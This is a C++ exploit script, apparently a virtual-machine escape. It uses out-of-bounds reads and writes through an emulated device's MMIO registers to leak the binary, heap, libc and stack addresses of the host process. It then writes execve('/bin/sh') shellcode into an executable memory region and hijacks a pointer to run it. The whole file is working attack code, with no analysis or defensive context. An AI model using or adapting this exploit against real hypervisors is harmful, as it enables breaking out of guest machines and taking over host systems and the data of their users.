#include <cstdint>
#include <cstdio>
#include <iostream>
#include <string>

using namespace std;

const uint64_t MMIO_BASE = 0xfebd2000;
const uint64_t MMIO_DATA = 0xfebd2000 + 8;
const uint64_t MMIO_OFFSET = 0xfebd2000;

uint32_t read_mmio(uintptr_t addr) {
  std::string cmd = format("busybox devmem 0x{:x}", addr);
  FILE *f = popen(cmd.c_str(), "r");

  char buf[64];
  fgets(buf, sizeof(buf), f);
  pclose(f);

  return strtol(buf, NULL, 16);
}

void write_mmio(uintptr_t addr, uint32_t val) {

  std::string cmd = format("busybox devmem 0x{:x} w 0x{:x}", addr, val);
  FILE *f = popen(cmd.c_str(), "r");

  pclose(f);
}

uint32_t read_offset(intptr_t offset) {
  write_mmio(MMIO_OFFSET, offset & 0xffffffff);
  write_mmio(MMIO_OFFSET + 4, offset >> 32);
  return read_mmio(MMIO_DATA);
}

uint64_t read64_offset(intptr_t offset) {
  uint64_t lb = read_offset(offset);
  uint64_t hb = read_offset(offset + 4);

  return lb | (hb << 32);
}

void write_offset(intptr_t offset, uint32_t val) {
  write_mmio(MMIO_OFFSET, offset & 0xffffffff);
  write_mmio(MMIO_OFFSET + 4, offset >> 32);
  write_mmio(MMIO_DATA, val);
}
void write64_offset(intptr_t offset, uint64_t val) {
  write_offset(offset, val & 0xffffffff);
  write_offset(offset + 4, val >> 32);
}

const uint64_t BINARY_LEAK_OFFSET = 0x7b44a0;
const uint64_t HEAP_OFFSET = 0x115f8f0;
const uint64_t BUF_HEAP_OFFSET = 0x11615c8;
const uint64_t MALLOC_GOT_OFFSET = 0x18e23f8;
const uint64_t MALLOC_OFFSET = 0xad640;
const uint64_t ENVIRON_OFFSET = 0x20ad58;
const uint64_t BIN_SH_OFFSET = 0x1445f0;
const uint64_t BULLSHIT_POINTER_OFFSET = -0x18a0;
const uint64_t THREAD_STACK_OFFSET = 3134928;
const uint64_t POP_RSP_OFFSET = 0x00000000005f5b3b;
const uint64_t RWX_HEAP_OFFSETT = 167168;
/*const uint64_t RWX_OFFSET = 0x8e0 + 0x1ed4000;*/
const uint64_t RWX_OFFSET = 0x8e0;
const uint64_t BSS_OFFSET = 0x19faf9c;
const uint64_t SHELLCODE_OFFSET = 0x100;
const unsigned char SHELLCODE[] = {
    72,  184, 1,   1,   1,  1,   1,   1,  1,  1,  80, 72, 184,
    46,  99,  104, 111, 46, 114, 105, 1,  72, 49, 4,  36, 72,
    137, 231, 49,  210, 49, 246, 106, 59, 88, 15, 5};

int main() {
  uint64_t binary_leak = read64_offset(0x0130);
  uint64_t binary_base = binary_leak - BINARY_LEAK_OFFSET;
  cout << "BINARY BASE: " << format("0x{:x}", binary_base) << endl;
  uint64_t heap_leak = read64_offset(0x0118);
  uint64_t heap_base = heap_leak - HEAP_OFFSET;
  cout << "HEAP LEAK: " << format("0x{:x}", heap_base) << endl;
  uint64_t buf = heap_base + BUF_HEAP_OFFSET;

  uint64_t malloc = read64_offset(binary_base + MALLOC_GOT_OFFSET - buf);
  uint64_t libc_base = malloc - MALLOC_OFFSET;
  cout << "LIBC_BASE: " << format("0x{:x}", libc_base) << endl;

  uint64_t environ_data = read64_offset(libc_base + ENVIRON_OFFSET - buf);
  cout << "STACK LEAK: " << format("0x{:x}", environ_data) << endl;

  uint64_t thread_stack = read64_offset(heap_base + THREAD_STACK_OFFSET - buf);
  cout << "THREAD STACK LEAK: " << format("0x{:x}", thread_stack) << endl;

  /*write64_offset(thread_stack - 0x1b68 - buf + 8, 0xAAAAAAAAAAAAAAAA);*/
  /*write_offset(thread_stack - 0x1b68 - buf,*/
  /*             (binary_base + POP_RSP_OFFSET) & 0xffffffff);*/
  /*write_offset(0, 1);*/

  uint64_t bullshit_pointer =
      read64_offset(thread_stack + BULLSHIT_POINTER_OFFSET - buf);
  cout << "BULLSHIT LEAK: " << format("0x{:x}", bullshit_pointer) << endl;
  uint64_t rwx_leak = read64_offset(heap_base + RWX_HEAP_OFFSETT - buf);

  uint64_t rwx_base = rwx_leak - RWX_OFFSET;
  cout << "RWX AREA: " << format("0x{:x}", rwx_base) << endl;

  for (int i = 0; i < sizeof(SHELLCODE); i += 4) {
    printf("sw %i/%zu\n", i, sizeof(SHELLCODE));
    write_offset(rwx_base + SHELLCODE_OFFSET - buf + i,
                 *(uint32_t *)(SHELLCODE + i));
  }

  const uint64_t to_write[] = {
      0, 0, rwx_base + SHELLCODE_OFFSET, binary_base + 0x73c7d0,
      /*0,*/
      /*0x0000000800000001,*/
      /*0,*/
      /*binary_base + 0x73a520,*/
      /*1,*/
      /*0,*/
      /*0,*/
      /*0,*/
  };

  for (int i = 0; i < sizeof(to_write) / sizeof(to_write[0]); i++) {
    printf("bw %i/%zu\n", i, sizeof(to_write) / sizeof(to_write[0]));
    write64_offset(binary_base + BSS_OFFSET - buf + i * 8, to_write[i]);
  }
  puts("WRITTEN");
  scanf("%*c");

  write_offset(bullshit_pointer + 80 - buf,
               (binary_base + BSS_OFFSET) & 0xffffffff);
  read_offset(0);
}
